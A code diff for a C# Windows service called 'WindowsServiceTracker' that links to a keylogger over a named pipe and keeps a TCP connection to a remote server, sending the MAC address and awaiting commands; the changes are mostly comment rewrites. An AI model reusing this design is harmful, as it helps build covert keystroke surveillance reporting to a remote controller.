@@ -35,14 +35,18 @@ namespace WindowsServiceTracker
 
         //Variables
         private IPEndPoint ipPort = new IPEndPoint(IP_ADDRESS, PORT);
-        private volatile TcpClient tcp;
-        private NetworkStream tcpStream;
         private ChannelFactory<KeyloggerCommInterface> pipeFactory = new ChannelFactory<KeyloggerCommInterface>(
             new NetNamedPipeBinding(), new EndpointAddress("net.pipe://localhost/PipeKeylogger"));
         private KeyloggerCommInterface pipeProxy;
         private Thread tcpThread;
         private volatile bool tcpKeepAlive = true;
         private volatile string macAddress = null;
+
+        // Variables in this block are intended to be used only with the thread
+        // maintaining the tcp connection. They are not thread safe and should
+        // not be used by other threads without making them volatile.
+        private NetworkStream tcpStream;
+        private TcpClient tcp;
 
         /* Constructor for the service. Currently only creates an event log source
          * that is used to output errors with in the windows event logs.
@@ -149,9 +153,9 @@ namespace WindowsServiceTracker
 
         /* Gets the MAC address of the laptop. The method loops through all existing network
          * adapters looking for an ethernet adapter, if one is found then it is immediately
-         * returned. If not, then it looks for a WiFi adapter. If it finds a wifi adapter it
-         * will continue looping to prioritize for ethernet. If neither WiFi nor Ethernet is
-         * found then the last MAC address is used.
+         * returned. If not, then it looks for the first WiFi adapter in the list. If it finds 
+         * a wifi adapter it will continue looping to prioritize for ethernet. If neither WiFi 
+         * nor Ethernet is found then the MAC address of the active adapter is used.
          */
         private string getMacAddress()
         {
@@ -178,7 +182,10 @@ namespace WindowsServiceTracker
             return mac;
         }
 
-        //make a thread based on this method to connect to the server and read/write to the tcp connection
+        /* This method is used to create a thread that will constantly try to connect
+         * to the server while it is active. When a connection is established, the
+         * MAC address is immidiately sent to the server and it waits for commands.
+         */
         private void MaintainServerConnection()
         {
             macAddress = getMacAddress();
@@ -248,7 +255,8 @@ namespace WindowsServiceTracker
             }
         }
 
-        //Creates a new connection with the server.
+        /* Creates a new connection with the server.
+         */
         private bool Connect()
         {
             try
@@ -263,8 +271,9 @@ namespace WindowsServiceTracker
             }
         }
 
-        //Checks to see if there is an open TCP connection and attempts to write to it.
-        private bool CheckTCPConnected() // todo fix this shit
+        /* Checks to see if there is an open TCP connection and attempts to write to it.
+         */
+        private bool CheckTCPConnected() // todo fix this
         {
             if (tcp == null || tcpStream == null)
             {
@@ -283,7 +292,8 @@ namespace WindowsServiceTracker
             }
         }
 
-        //Closes the TCP connection with the server
+        /* Closes the TCP connection with the server
+         */
         private bool Disconnect()
         {
             try
@@ -295,8 +305,8 @@ namespace WindowsServiceTracker
             return true;
         }
 
-        /* Returns the TCP Stream from the TCP connection object once the TCP connection
-         * has been established.
+        /* Attempts to get get the NetworkStream from the tcp connection and
+         * assign it to the tcpStream variable.
          */
         private bool getTcpStream()
         {
@@ -311,7 +321,8 @@ namespace WindowsServiceTracker
             return true;
         }
 
-        //Attempts to write the message passed in as an argument to the TCP Stream
+        /* Attempts to write the message passed in as an argument to the TCP Stream
+         */
         private bool SendStringMsg(string stringMsg)
         {
             if (tcpStream != null && tcpStream.CanWrite)
